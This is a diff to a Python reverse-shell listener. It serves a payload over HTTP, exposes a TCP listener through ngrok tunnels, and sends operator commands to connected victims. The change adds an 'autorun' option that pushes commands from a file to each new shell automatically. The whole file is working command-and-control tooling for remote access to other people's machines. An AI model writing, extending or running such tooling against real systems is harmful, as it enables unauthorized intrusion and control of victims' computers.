@@ -2,6 +2,7 @@ import socket, os, threading, time, sys, json
 from http.server import BaseHTTPRequestHandler, HTTPServer
 from pyngrok import ngrok
 
+# Simple logging class
 class Log:
     def info(self, msg):
         print("[*] " + msg)
@@ -18,11 +19,13 @@ class Log:
     def inpt(self, msg):
         return input("[>] " + msg)
 
+# The server the client will connect to
 class RevServer:
-    def __init__(self, host, port):
+    def __init__(self, host, port, autorun):
         self.log = Log()
         self.host = host
         self.port = port
+        self.autorun = autorun
 
     def start(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -31,6 +34,12 @@ class RevServer:
         self.log.info("Listening on " + self.host + ":" + self.port)
         conn, addr = s.accept()
         self.log.info("Connection from " + addr[0] + ":" + str(addr[1]))
+        if self.autorun:
+            with open("Assets/autorun.txt", "r") as f:
+                for line in f:
+                    if line:
+                        conn.send(line.encode())
+                self.log.info("Autorun loaded, Press enter to continue")
         while True:
             ans = conn.recv(1024).decode()
             if ans:
@@ -39,13 +48,14 @@ class RevServer:
             command += "\n"
             conn.send(command.encode())
             time.sleep(1)
+            sys.stdout.write("\033[A"+ans.split("\n")[-1])
             if command == "exit\n":
                 conn.close()
                 self.log.error("Connection closed")
                 exit()
 
 
-
+# Creates an http server that returns the payload
 def create_handler(payload):
     class PayServer(BaseHTTPRequestHandler):
         def do_GET(self):
@@ -58,6 +68,7 @@ def create_handler(payload):
             print(f"[!] {self.address_string()} [{self.log_date_time_string()}] {format % args}")
     return PayServer
 
+# Starts the ngrok servers
 class NgrokServer:
     def __init__(self, key):
         self.log = Log()
@@ -82,6 +93,7 @@ class NgrokServer:
         self.tcp_url = tunnel.public_url
         self.log.info("Ngrok tunnel: " + tunnel.public_url)
 
+# Main function
 class Main:
     def __init__(self):
         self.log = Log()
@@ -90,7 +102,9 @@ class Main:
         self.web_host, self.web_port = self.load_host()
         self.rev_host = self.log.inpt("Reverse host: ")
         self.rev_port = self.log.inpt("Reverse port: ")
-        self.rev_server = RevServer(self.rev_host, self.rev_port)
+        autorun = self.log.inpt("Autorun?: ")
+        self.autorun = False if autorun == "n" else True
+        self.rev_server = RevServer(self.rev_host, self.rev_port, self.autorun)
         self.ngrok_server = NgrokServer(self.key())
         self.ngrok_server.tcp(self.rev_port)
 
